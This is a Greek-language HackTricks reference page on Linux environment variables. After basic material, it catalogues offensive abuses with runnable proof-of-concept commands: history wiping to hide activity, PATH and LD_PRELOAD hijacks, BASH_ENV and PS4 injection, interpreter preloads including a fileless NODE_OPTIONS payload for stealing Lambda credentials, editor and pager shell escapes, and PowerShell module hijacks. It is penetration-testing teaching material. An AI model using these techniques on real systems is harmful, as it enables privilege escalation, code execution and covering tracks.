# Μεταβλητές περιβάλλοντος Linux

{{#include ../../banners/hacktricks-training.md}}

## Καθολικές μεταβλητές

Οι καθολικές μεταβλητές **θα** κληρονομούνται από **θυγατρικές διεργασίες**.

Μπορείτε να δημιουργήσετε μια καθολική μεταβλητή για την τρέχουσα συνεδρία σας ως εξής:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Αυτή η μεταβλητή θα είναι προσβάσιμη από τις τρέχουσες συνεδρίες σας και τις θυγατρικές διεργασίες τους.

Μπορείτε να **αφαιρέσετε** μια μεταβλητή ως εξής:

```bash
unset MYGLOBAL
```

## Τοπικές μεταβλητές

Οι **τοπικές μεταβλητές** είναι **προσβάσιμες** μόνο από το **τρέχον shell/script**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Λίστα τρεχουσών μεταβλητών

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

Τα περιεχόμενα του /proc/*/environ είναι **διαχωρισμένα με NUL**, οπότε αυτές οι παραλλαγές συνήθως διαβάζονται ευκολότερα:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

Αν αναζητάτε **credentials** ή **ενδιαφέρουσα διαμόρφωση υπηρεσιών** σε κληρονομημένα environments, ελέγξτε επίσης το [Linux Post Exploitation](../post-exploitation/README.md).

## Συνήθεις μεταβλητές

Από: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – η οθόνη που χρησιμοποιείται από το **X**. Αυτή η μεταβλητή συνήθως ορίζεται σε **:0.0**, που σημαίνει την πρώτη οθόνη στον τρέχοντα υπολογιστή.
- **EDITOR** – το πρόγραμμα επεξεργασίας κειμένου που προτιμά ο χρήστης.
- **HISTFILESIZE** – ο μέγιστος αριθμός γραμμών που περιέχει το αρχείο ιστορικού.
- **HISTSIZE** – ο αριθμός γραμμών που προστίθενται στο αρχείο ιστορικού όταν ο χρήστης ολοκληρώνει τη συνεδρία του
- **HOME** – ο προσωπικός σας κατάλογος.
- **HOSTNAME** – το hostname του υπολογιστή.
- **LANG** – η τρέχουσα γλώσσα σας.
- **MAIL** – η τοποθεσία του αρχείου αλληλογραφίας του χρήστη. Συνήθως **/var/spool/mail/USER**.
- **MANPATH** – η λίστα καταλόγων στους οποίους γίνεται αναζήτηση για σελίδες εγχειριδίου.
- **OSTYPE** – ο τύπος του λειτουργικού συστήματος.
- **PS1** – η προεπιλεγμένη προτροπή στο bash.
- **PATH** – αποθηκεύει τη διαδρομή όλων των καταλόγων που περιέχουν εκτελέσιμα αρχεία, τα οποία θέλετε να εκτελείτε καθορίζοντας μόνο το όνομα του αρχείου και όχι σχετική ή απόλυτη διαδρομή.
- **PWD** – ο τρέχων κατάλογος εργασίας.
- **SHELL** – η διαδρομή προς το τρέχον command shell (για παράδειγμα, **/bin/bash**).
- **TERM** – ο τρέχων τύπος τερματικού (για παράδειγμα, **xterm**).
- **TZ** – η ζώνη ώρας σας.
- **USER** – το τρέχον όνομα χρήστη σας.

## Ενδιαφέρουσες μεταβλητές για hacking

Δεν είναι όλες οι μεταβλητές εξίσου χρήσιμες. Από επιθετική σκοπιά, δώστε προτεραιότητα στις μεταβλητές που αλλάζουν **διαδρομές αναζήτησης**, **αρχεία εκκίνησης**, **τη συμπεριφορά του dynamic linker** ή **τον έλεγχο και την καταγραφή συμβάντων**.

### **HISTFILESIZE**

Αλλάξτε την **τιμή αυτής της μεταβλητής σε 0**, ώστε όταν **τερματίσετε τη συνεδρία σας**, το **αρχείο ιστορικού** (\~/.bash_history) να **περικοπεί σε 0 γραμμές**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

Αλλάξτε την **τιμή αυτής της μεταβλητής σε 0**, ώστε οι εντολές να **μην αποθηκεύονται στο ιστορικό της μνήμης** και να μην εγγράφονται ξανά στο **αρχείο ιστορικού** (\~/.bash_history).

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

Αν **η τιμή αυτής της μεταβλητής έχει οριστεί σε `ignorespace` ή `ignoreboth`**, οποιαδήποτε εντολή έχει ένα επιπλέον κενό στην αρχή της δεν θα αποθηκευτεί στο ιστορικό.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

Ορίστε το **history file** σε **`/dev/null`** ή καταργήστε το εντελώς. Αυτό είναι συνήθως πιο αξιόπιστο από την απλή αλλαγή του μεγέθους του ιστορικού.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Οι διεργασίες θα χρησιμοποιούν το **proxy** που δηλώνεται εδώ για να συνδεθούν στο διαδίκτυο μέσω **http ή https**.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: προεπιλεγμένος proxy για εργαλεία/πρωτόκολλα που τον υποστηρίζουν.
- `no_proxy`: λίστα εξαιρέσεων (hosts/domains/CIDRs) που πρέπει να συνδέονται απευθείας.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Τόσο οι πεζές όσο και οι κεφαλαίες παραλλαγές μπορεί να χρησιμοποιούνται, ανάλογα με το εργαλείο (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Οι διεργασίες θα εμπιστεύονται τα πιστοποιητικά που υποδεικνύονται σε **αυτές τις μεταβλητές περιβάλλοντος**. Αυτό είναι χρήσιμο για να κάνουν εργαλεία όπως τα **`curl`**, **`git`**, οι HTTP clients της Python ή οι διαχειριστές πακέτων να εμπιστεύονται μια CA που ελέγχεται από τον attacker (για παράδειγμα, ώστε ένα interception proxy να φαίνεται νόμιμο).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Αν ένα privileged wrapper/script εκτελεί εντολές **χωρίς absolute paths**, υπερισχύει ο **πρώτος κατάλογος που ελέγχεται από τον attacker** στο `PATH`. Αυτός είναι ο μηχανισμός πίσω από πολλά **PATH hijacks** σε `sudo`, cron jobs, shell wrappers και custom SUID helpers. Αναζητήστε `env_keep+=PATH`, αδύναμο `secure_path` ή wrappers που καλούν τα `tar`, `service`, `cp`, `python` κ.λπ. με το όνομά τους.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

Για πλήρεις αλυσίδες privilege-escalation που κάνουν κατάχρηση του `PATH`, δες [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

Το `HOME` δεν είναι απλώς αναφορά σε κατάλογο: πολλά εργαλεία φορτώνουν αυτόματα **dotfiles**, **plugins** και **διαμόρφωση ανά χρήστη** από το `$HOME` ή το `$XDG_CONFIG_HOME`. Αν μια privileged ροή εργασιών διατηρεί αυτές τις τιμές, το **config injection** μπορεί να είναι ευκολότερο.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Ενδιαφέροντες στόχοι περιλαμβάνουν τα `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` και αρχεία ειδικά για εργαλεία, όπως το `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Αυτές οι μεταβλητές επηρεάζουν τον **dynamic linker**:

- `LD_PRELOAD`: επιβάλλει τη φόρτωση επιπλέον shared objects πρώτα.
- `LD_LIBRARY_PATH`: προσθέτει στην αρχή καταλόγους αναζήτησης βιβλιοθηκών.
- `LD_AUDIT`: φορτώνει βιβλιοθήκες auditor που παρακολουθούν τη φόρτωση βιβλιοθηκών και την επίλυση συμβόλων.

Είναι εξαιρετικά χρήσιμες για **hooking**, **instrumentation** και **privilege escalation**, αν μια προνομιούχα εντολή τις διατηρεί. Σε λειτουργία **secure-execution** (`AT_SECURE`, π.χ. με setuid/setgid/capabilities), ο loader αφαιρεί ή περιορίζει πολλές από αυτές τις μεταβλητές. Ωστόσο, σφάλματα parser σε αυτό το πρώιμο στάδιο του loader εξακολουθούν να έχουν σοβαρές επιπτώσεις, επειδή εκτελούνται **πριν** από το πρόγραμμα-στόχο.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

Το `GLIBC_TUNABLES` αλλάζει τη συμπεριφορά της glibc στα πρώτα στάδια (για παράδειγμα, τις ρυθμίσεις του allocator) και είναι πολύ χρήσιμο σε exploit labs. Έχει επίσης σημασία από άποψη ασφάλειας, επειδή ο **dynamic loader το αναλύει πολύ νωρίς**. Το bug **Looney Tunables** του 2023 υπενθύμισε ότι μία μόνο μεταβλητή περιβάλλοντος που αναλύεται από τον loader μπορεί να αποτελέσει **primitive τοπικής κλιμάκωσης προνομίων** σε βάρος προγραμμάτων SUID.<sup>[[6]](#references)</sup>

Για το CVE-2023-4911, συγκρίνετε την **έκδοση του εγκατεστημένου πακέτου της διανομής** με τη διορθωμένη έκδοση του προμηθευτή του και επαληθεύστε ποιος loader χρησιμοποιείται στην πράξη για τις νέες διεργασίες. Η συμβολοσειρά έκδοσης upstream από μόνη της δεν είναι αξιόπιστη: το Debian ενσωμάτωσε τον ευάλωτο parser στο πακέτο 2.31, ενώ άλλες διανομές ενσωμάτωσαν διορθώσεις χωρίς να αλλάξουν τον αριθμό upstream. Για να επιτευχθεί στην πράξη μετάβαση προνομίων, απαιτείται επίσης ένας εκτελέσιμος προνομιούχος στόχος, του οποίου η αλλαγή ταυτότητας δεν εμποδίζεται από το `NoNewPrivs`, ένα mount `nosuid` ή κάποιο άλλο μέτρο μετριασμού. Αποφύγετε να εκτελείτε probe που προκαλεί κατάρρευση με κακοσχηματισμένο `GLIBC_TUNABLES` κατά την παθητική αναγνώριση. Ανατρέξτε στον [ιχνηλάτη του Ubuntu](https://ubuntu.com/security/CVE-2023-4911), στον [ιχνηλάτη του Debian](https://security-tracker.debian.org/tracker/CVE-2023-4911) και στη [συμβουλευτική ανακοίνωση της Red Hat](https://access.redhat.com/security/cve/cve-2023-4911) για πληροφορίες σχετικά με την εφαρμογή ανά έκδοση· η [ειδοποίηση ασφαλείας του Ubuntu](https://ubuntu.com/security/notices/USN-6409-1) αναφέρει επίσης ότι απαιτείται επανεκκίνηση μετά την ενημέρωση.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

Αν το **Bash** ξεκινήσει **μη διαδραστικά**, ελέγχει το `BASH_ENV` και κάνει source αυτό το αρχείο πριν εκτελέσει το script-στόχο. Όταν το Bash καλείται ως `sh` ή σε διαδραστική λειτουργία τύπου POSIX, μπορεί επίσης να ελεγχθεί το `ENV`. Αυτός είναι ένας κλασικός τρόπος να μετατραπεί ένα shell wrapper σε εκτέλεση κώδικα, όταν το περιβάλλον ελέγχεται από attacker.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Το Bash αγνοεί αυτά τα αρχεία εκκίνησης όταν τα **real/effective IDs διαφέρουν**· το `-p` διατηρεί το effective ID, αλλά δεν ενεργοποιεί αυτά τα αρχεία εκκίνησης, επομένως η ακριβής συμπεριφορά εξαρτάται από τον τρόπο με τον οποίο το wrapper εκκινεί το shell. Να είστε προσεκτικοί με privileged wrappers που καλούν `setuid()`/`setgid()` **πριν** από την εκκίνηση του Bash: όταν τα IDs ταιριάξουν ξανά, το Bash μπορεί να εμπιστευτεί τα `BASH_ENV`, `ENV` και τη σχετική κατάσταση του shell, τα οποία διαφορετικά θα αγνοούσε.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Όταν το Bash εκτελείται με ενεργοποιημένο το **xtrace**, κάνει expansion του `PS4` και το εμφανίζει πριν από κάθε εντολή που καταγράφεται. Το `PS4` γίνεται expansion όπως ένα prompt, επομένως εκτελείται οποιοδήποτε **command substitution** περιέχει. Το σημαντικό είναι ότι το xtrace μπορεί να ενεργοποιηθεί αποκλειστικά μέσω του environment, με export του `SHELLOPTS=xtrace` — δεν χρειάζεται `-x` στη γραμμή εντολών — άρα οποιοδήποτε Bash script εκτελέσει το θύμα οδηγεί σε code execution.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` δεν κάνει τίποτα μέχρι να ενεργοποιηθεί το xtrace (`SHELLOPTS=xtrace`, `set -x` ή `bash -x`), και το Bash απορρίπτει το `SHELLOPTS` σε περιβάλλοντα με αυξημένα προνόμια/setuid, όπως ακριβώς και το `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Αυτές οι μεταβλητές αλλάζουν τον τρόπο εκκίνησης του Python:

- `PYTHONPATH`: προσθέτει διαδρομές αναζήτησης για imports στην αρχή.
- `PYTHONHOME`: αλλάζει τη θέση του δέντρου της standard library.
- `PYTHONSTARTUP`: εκτελεί ένα αρχείο πριν από το interactive prompt.
- `PYTHONINSPECT=1`: εισέρχεται σε interactive mode μετά την ολοκλήρωση ενός script.
- `PYTHONBREAKPOINT`: καλεί το `package.module.callable` (και κάνει import το module του) όταν ο κώδικας φτάσει στο `breakpoint()`.<sup>[[8]](#references)</sup>

Είναι χρήσιμες εναντίον maintenance scripts, debuggers, shells και wrappers που καλούν το Python με περιβάλλον το οποίο μπορεί να ελεγχθεί. Τα `python -E` και `python -I` αγνοούν όλες τις μεταβλητές `PYTHON*`.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Ένα πρόσφατο παράδειγμα από τον πραγματικό κόσμο ήταν το LPE του 2024 στο **needrestart** σε συστήματα Ubuntu/Debian: ο σαρωτής, που εκτελούνταν ως root, αντέγραψε το `PYTHONPATH` μιας μη προνομιούχας διεργασίας από το `/proc/<PID>/environ` και έπειτα εκτέλεσε Python. Το δημοσιευμένο exploit τοποθέτησε το `importlib/__init__.so` σε διαδρομή που ελεγχόταν από τον επιτιθέμενο, ώστε η Python να εκτελέσει κώδικα του επιτιθέμενου κατά τη δική της αρχικοποίηση, πριν καν έχει σημασία το script του helper με τη hard-coded διαδρομή.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Η Perl έχει εξίσου χρήσιμες μεταβλητές εκκίνησης:

- `PERL5LIB`: προσθέτει καταλόγους βιβλιοθηκών στην αρχή της λίστας.
- `PERL5OPT`: εισάγει switches σαν να υπήρχαν στη γραμμή εντολών κάθε `perl`.

Αυτό μπορεί να προκαλέσει **automatic module loading** ή να αλλάξει τη συμπεριφορά του interpreter πριν το script-στόχος κάνει οτιδήποτε ενδιαφέρον. Η Perl αγνοεί αυτές τις μεταβλητές σε περιβάλλοντα **taint / setuid / setgid**, αλλά εξακολουθούν να έχουν μεγάλη σημασία για συνηθισμένα wrappers που εκτελούνται ως root, εργασίες CI, installers και προσαρμοσμένους κανόνες sudoers.

Αν ένας κανόνας sudo επιτρέπει παρακάμψεις μεταβλητών περιβάλλοντος και η προνομιούχα εντολή του εκκινεί τελικά Perl, ελέγξτε επίσης το `PERL5DB`. Η τεκμηρίωση της Perl αναφέρει ότι το `PERL5OPT=-d` εκκινεί το debugger και ότι το `PERL5DB` παρέχει κώδικα αρχικοποίησης του debugger όταν η Perl εκκινείται με ένα σκέτο switch `-d`. Η αποδέσμευση μόνο των `PERL5LIB` και `PERLLIB` δεν εξαλείφει αυτή τη δυνατότητα. Οι μεταβλητές πρέπει να διατηρηθούν από το sudo και το wrapper, ενώ η διεργασία Perl δεν πρέπει να τις αγνοήσει λόγω χειρισμού taint ή set-ID· εξετάστε τον ακριβή κανόνα και την αλυσίδα εκτέλεσης χωρίς να εκτελέσετε το προνομιούχο helper κατά την απαρίθμηση. Δείτε την [αναφορά της perlrun για τις μεταβλητές περιβάλλοντος](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Η ενσωματωμένη διαδρομή αναζήτησης [`@INC` της Perl](https://perldoc.perl.org/perlvar#@INC) αποτελεί ένα ακόμη όριο εμπιστοσύνης για modules, ακόμη και χωρίς διατήρηση μεταβλητών περιβάλλοντος. Για μια προνομιούχα διεργασία Perl, συσχετίστε μια πραγματική δήλωση `use` ή `require` με το όνομα του module που επιλύεται, τη σειρά αναζήτησης και τη δυνατότητα ενός χρήστη με χαμηλότερα προνόμια να δημιουργήσει ή να αντικαταστήσει αυτό το module σε έναν κατάλογο που περιλαμβάνεται στην αναζήτηση. Το ότι ένας κατάλογος βιβλιοθηκών είναι εγγράψιμος δεν αποδεικνύει από μόνο του ότι η προνομιούχα διεργασία θα φορτώσει κώδικα από εκεί.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

Το `NODE_OPTIONS` προσθέτει **Node.js CLI flags** πριν από τα ορίσματα κάθε διεργασίας `node` που κληρονομεί το περιβάλλον. Αυτό το καθιστά χρήσιμο απέναντι σε wrappers, εργασίες CI, βοηθητικές διεργασίες Electron και κανόνες sudo που τελικά εκτελούν Node. Τα πιο ενδιαφέροντα flags για offensive χρήση είναι συνήθως:

- `--require <file>`: φορτώνει εκ των προτέρων ένα αρχείο CommonJS πριν από το target script.
- `--import <module>`: φορτώνει εκ των προτέρων ένα ES module πριν από το target script.

Το Node απορρίπτει ορισμένα επικίνδυνα flags στο `NODE_OPTIONS`, αλλά τα `--require` και `--import` επιτρέπονται ρητά και υποβάλλονται σε επεξεργασία **πριν** από τα κανονικά ορίσματα της γραμμής εντολών.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### Fileless preload με URL `data:`

Όταν μπορείς να ορίσεις το `NODE_OPTIONS`, αλλά **δεν μπορείς να γράψεις αρχείο** στον στόχο (σύστημα αρχείων μόνο για ανάγνωση, περιορισμένο API, serverless runtime κ.λπ.), το `--import` δέχεται ένα URL `data:text/javascript,`, ώστε ολόκληρο το payload να μεταφέρεται μέσα στην ίδια τη μεταβλητή περιβάλλοντος. Η JavaScript πρέπει να είναι **πλήρως κωδικοποιημένη σε URL** — το Node αναλύει την τιμή ως URL, επομένως οποιοδήποτε μη κωδικοποιημένο κενό (ή άλλος χαρακτήρας) αποκόπτει το payload και προκαλεί `SyntaxError`. Αυτό λειτουργεί στο Node 20.6+, όπου το `--import` βρίσκεται στη λίστα επιτρεπόμενων επιλογών του `NODE_OPTIONS`.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Αυτός είναι ένας συνηθισμένος τρόπος να μετατρέψετε τον έλεγχο του `NODE_OPTIONS` σε RCE σε **managed cloud runtimes** των οποίων οι functions εκτελούν Node. Για παράδειγμα, ένας attacker που μπορεί να αλλάξει μόνο τη διαμόρφωση ενός Lambda (`lambda:UpdateFunctionConfiguration`, χωρίς `iam:PassRole` και χωρίς ενημέρωση κώδικα) μπορεί να εισαγάγει `NODE_OPTIONS=--import data:text/javascript,<payload>` για να εκτελέσει κώδικα μέσα στη function και να κλέψει τα credentials του execution role. Το injected module εκτελείται **πριν** από τον handler, ο οποίος στη συνέχεια εξακολουθεί να εκτελείται κανονικά.
>
> Για remote gadget chains που ορίζουν έμμεσα το `NODE_OPTIONS` (για παράδειγμα, prototype-pollution to RCE), δείτε [αυτήν την άλλη σελίδα](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Η Ruby προσφέρει την ίδια κατηγορία κατάχρησης κατά την εκκίνηση:

- `RUBYLIB`: προσθέτει καταλόγους στην αρχή της διαδρομής φόρτωσης της Ruby.
- `RUBYOPT`: εισάγει επιλογές γραμμής εντολών, όπως `-r`, σε κάθε invocation της `ruby`.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

Οι ευπάθειες του **needrestart** του 2024 έδειξαν ότι αυτό δεν είναι απλώς ένα κόλπο για lab: το ίδιο helper που ανήκε στον root και ήταν ευάλωτο σε κατάχρηση του `PYTHONPATH` μπορούσε επίσης να εξαναγκαστεί να εκτελέσει Ruby με ένα `RUBYLIB` που ελεγχόταν από τον attacker, φορτώνοντας το `enc/encdb.so` από έναν κατάλογο του attacker.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Τα Vim/Neovim εκτελούν τις εντολές Ex που περιέχονται στο `VIMINIT` (ή στο εναλλακτικό `EXINIT`) κατά την κανονική εκκίνηση. Οι εντολές Ex περιλαμβάνουν τις `:!cmd` και `:call system(...)`, επομένως ο έλεγχος της μεταβλητής επιτρέπει την εκτέλεση κώδικα κάθε φορά που ένα θύμα ανοίγει το Vim (ένα `root sudo vim`, `crontab -e`, `visudo`, ή τα `$EDITOR` που εκκινούν τα `git`/`less`, κ.λπ.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Η λειτουργία batch (`vim -es`/`-Es`) παραλείπει αυτές τις μεταβλητές, αλλά μια κανονική διαδραστική εκκίνηση τις εκτελεί.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

Το PowerShell Core (`pwsh`) εκτελείται σε Linux/macOS (και Windows) και είναι **εφαρμογή .NET**, επομένως αρκετές μεταβλητές περιβάλλοντος μετατρέπουν κάθε εκτέλεση του `pwsh` με κληρονομημένο περιβάλλον σε εκτέλεση κώδικα — χρήσιμο απέναντι σε εργασίες cron/systemd, CI runners και προνομιούχα wrappers που εκκινούν το `pwsh` μέσω shell.

- `PSModulePath`: Το PowerShell αναζητά αναδρομικά σε κάθε κατάλογο αυτής της λίστας για modules `.psd1`/`.psm1` και **φορτώνει αυτόματα** ένα την πρώτη φορά που γίνεται αναφορά σε μια εντολή που εξάγει. Πρόσθεσε έναν κατάλογο στην αρχή και ο κώδικας του module σου εκτελείται κατά την εισαγωγή του· επειδή η επίλυση ακολουθεί τη σειρά *Alias → Function → Cmdlet*, μια εξαγόμενη function μπορεί ακόμη και να επισκιάσει ένα ενσωματωμένο cmdlet που καλεί το θύμα.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: Μεταφέρει το `powershell/Microsoft.PowerShell_profile.ps1`, το οποίο εκτελείται κατά την εκκίνηση (εκτός αν χρησιμοποιείται το `-NoProfile`).
- `DOTNET_STARTUP_HOOKS`: managed assembly της οποίας η `StartupHook.Initialize()` εκτελείται πριν από τη `Main` (κοινόχρηστη από κάθε εφαρμογή .NET).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: Το CLR profiling API φορτώνει μια βιβλιοθήκη του επιτιθέμενου στη διεργασία κατά την εκκίνηση (οι μεταβλητές διαδρομής υπερισχύουν του registry· το `DOTNET_*` είναι το νεότερο alias). Στο Windows PowerShell 5.1 (.NET Framework), χρησιμοποίησε `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Στα Windows, το `PSExecutionPolicyPreference=Bypass` αφαιρεί επιπλέον την προστασία που αποκλείει τα «μη υπογεγραμμένα scripts», ώστε ένα φυτεμένο profile/module να εκτελεστεί. Δείτε την ειδική σελίδα για πλήρη PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Ορισμένα εργαλεία δεν διαβάζουν απλώς μια διαδρομή από το περιβάλλον· περνούν την τιμή σε ένα **shell**, έναν **editor** ή έναν **preprocessor εισόδου**. Γι’ αυτό οι ακόλουθες μεταβλητές παρουσιάζουν ιδιαίτερο ενδιαφέρον όταν ένα προνομιούχο wrapper εκτελεί τα `git`, `man`, `less` ή παρόμοια προγράμματα προβολής κειμένου:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: επιλέγουν την εντολή pager.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: επιλέγουν την εντολή editor, συχνά μαζί με ορίσματα.
- `LESSOPEN`, `LESSCLOSE`: ορίζουν pre/post-processors που εκτελούνται όταν το `less` ανοίγει ένα αρχείο.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Το Git υποστηρίζει επίσης **έγχυση ρυθμίσεων μόνο μέσω μεταβλητών περιβάλλοντος** χωρίς εγγραφή στον δίσκο μέσω των `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` και `GIT_CONFIG_VALUE_<n>`:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

From a post-exploitation perspective, also remember that inherited environments often contain **credentials**, **proxy settings**, **service tokens**, or **cloud keys**. Check [Linux Post Exploitation](../post-exploitation/README.md) για αναζήτηση των `/proc/<PID>/environ` και `systemd` `Environment=`.

### PS1

Αλλάξτε την εμφάνιση του prompt σας.

[**Αυτό είναι ένα παράδειγμα**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Αυτό είναι ένα παράδειγμα](<../images/image (897).png>)

Τακτικός χρήστης:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο παρασκήνιο](<../images/image (740).png>)

Μία, δύο και τρεις εργασίες στο παρασκήνιο:

![PERL5OPT & PERL5LIB - PS1: Μία, δύο και τρεις εργασίες στο παρασκήνιο](<../images/image (145).png>)

Μία εργασία στο παρασκήνιο, μία σε αναστολή και η τελευταία εντολή δεν ολοκληρώθηκε σωστά:

![PERL5OPT & PERL5LIB - PS1: Μία εργασία στο παρασκήνιο, μία σε αναστολή και η τελευταία εντολή δεν ολοκληρώθηκε σωστά](<../images/image (715).png>)

## References

- [1] [Εγχειρίδιο GNU Bash - Αρχεία εκκίνησης του Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs στο needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Τεκμηρίωση CLI του Node.js - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Συνήθεις μεταβλητές περιβάλλοντος - Geek University](https://geek-university.com/linux/common-environment-variables/)
